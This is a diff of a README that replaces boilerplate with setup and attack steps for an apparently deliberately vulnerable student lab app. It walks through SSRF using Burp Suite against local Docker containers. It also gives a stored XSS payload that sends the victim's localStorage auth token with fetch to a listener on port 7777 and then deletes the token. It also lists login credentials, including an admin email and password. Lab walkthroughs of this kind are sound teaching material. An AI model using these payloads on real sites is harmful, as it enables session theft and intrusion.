@@ -1,70 +1,109 @@
-# Getting Started with CDAP PROJECT MANAGEMENT SYSTEM 
+Prerequisites
 
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+1. Make sure you have downloaded and installed 'docker' and 'docker compose'.
 
-## Available Scripts
 
-In the project directory, you can run:
+Steps to run the program
 
-### `npm start`
+1. Download the zip file and extract
+2. Go inside the root directory of the project(Vulnerable-Calibre)
+3. Right-click and open the terminal(make sure you are in the root directory of the project)
+4. Run the command "docker-compose build"
+5. Once the project is built run the command "docker-compose up"
+6. Use http://localhost:3000 to access the application.
+7. You can login into the system using the following login credentials. 
+	student ->	username: IT20194680@my.sliit.lk
+		      password: IT20194680@my.sliit.lk
 
-Runs the app in the development mode.\
-Open [http://localhost:3000](http://localhost:3000) to view it in your browser.
+	staff   ->	username: IT20194680@my.sliit.lk
+			password: IT20194680@my.sliit.lk
 
-The page will reload when you make changes.\
-You may also see any lint errors in the console.
+	admin   ->  username: chathushkarodrigo@gmail.com
+			password: happy123
 
-### `npm test`
 
-Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+SSRF - Server-Side Request Forgery
 
-### `npm run build`
+Detection
 
-Builds the app for production to the `build` folder.\
-It correctly bundles React in production mode and optimizes the build for the best performance.
+1. A network is vulnerable to SSRF attack when a link is accepted from the client side to the server side.
+2. Once such feauture exist in Upload picture for ID feature
+3. Make sure you open burpsuit application
+4. This feature can be accesed by logging into Student account and clicking on Upload picture for ID button(To login as a student use the username and password listed above)
+5. Once this is done turn on intercept and send the request and observe it in burpsuite
 
-The build is minified and the filenames include the hashes.\
-Your app is ready to be deployed!
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+Exploitation
+1. To exploit the application change the payload in delivered to a public ip
+2. This can be done using intruder to scan the local ip range
+3. In this project we have three applications backend, frontend and vulnerable server
+4. Vulnerable server is running on port 7777
+5. To find out the ip of the containers use the following command
 
-### `npm run eject`
+docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' name or id of the container
+example: docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' vulnerable-calibre_vulnerable_1
 
-**Note: this is a one-way operation. Once you `eject`, you can't go back!**
+You can find the name or id of the containers by running the command 'docker ps'
 
-If you aren't satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.
 
-Instead, it will copy all the configuration files and the transitive dependencies (webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you're on your own.
+6. Use the following command to find the ip of the vulnerable container and use that ip address with the port 3000 to access the frontend of the application and login to the application(make sure you do this step in browser provided by burpsuit)
 
-You don't have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn't feel obligated to use this feature. However we understand that this tool wouldn't be useful if you couldn't customize it when you are ready for it.
+7. Use the credentials given below to login
+	student ->	username: IT20194680@my.sliit.lk
+		        password: IT20194680@my.sliit.lk
+		        
+8. Once logged in go to Upload picture for ID feature section
 
-## Learn More
+9. Now turn on intercept in the burpsuite
 
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
+10. Add a link in the textbox and send the request
 
-To learn React, check out the [React documentation](https://reactjs.org/).
+11. Once the request is intercepted by the burpsuite send it to the repeater
 
-### Code Splitting
+12. Since we can find out the ip of the container we will use this ip with the port number and send the request to exploit the application(example: http://172.18.0.2:7777)
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/code-splitting](https://facebook.github.io/create-react-app/docs/code-splitting)
+13. As you can see we get the request from the vulnerable server
 
-### Analyzing the Bundle Size
+14. We could use the Intruder feature provided by burbsuite to scan the whole network since the range of public address is already known
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size](https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size)
 
-### Making a Progressive Web App
+Second Order Blind XSS
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app)
+Detection
 
-### Advanced Configuration
+1. Login as an admin and navigate to marks configuration > status document mark configuration.
+2. Enter invalid data format input into a text box.
+3. Checking whether the form is submitted
+4. If the form response is submitted it confirms whether the form has no input validation
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/advanced-configuration](https://facebook.github.io/create-react-app/docs/advanced-configuration)
+Exploitation
 
-### Deployment
+1.Login as admin user and navigate -> Marking Configuration -> Status Document Configuration -> Form 
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
+Enter the following malicious code (script 1 and script 2 separately)into the text box. 
+	++ Script 1 ++
 
-### `npm run build` fails to minify
+Click  <b onmouseover='async function fetchAsync (url) {var token = localStorage.getItem("authToken");await fetch("http://localhost:7777?token="+token);await response.json()} fetchAsync()'>Me</b> <b onmouseover='alert("I now have your Data You are hacked !")'>NOW </b> <b onmouseover='localStorage.removeItem("authToken");   window.location.reload();'> Get Out </b>
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
+	++ script 2 ++
+
+<img onmouseover='alert(localStorage.getItem("authToken"));' src='invalid-image' />
+
+
+2. open a new terminal and enter "python3 -m http.server 7777" 
+3. Check whether the form is submitted properly
+4. Login as a victim and navigate to 'add marks' 
+5. Again navigate to enter status document 1 marks
+6. Hover on injected code variable
+7. Blindly user exploited successfully (view hosted terminal to view victim data)
+8. Repeat the same step for malicious code number 2
+
+	
+
+
+
+
+
+
+
+
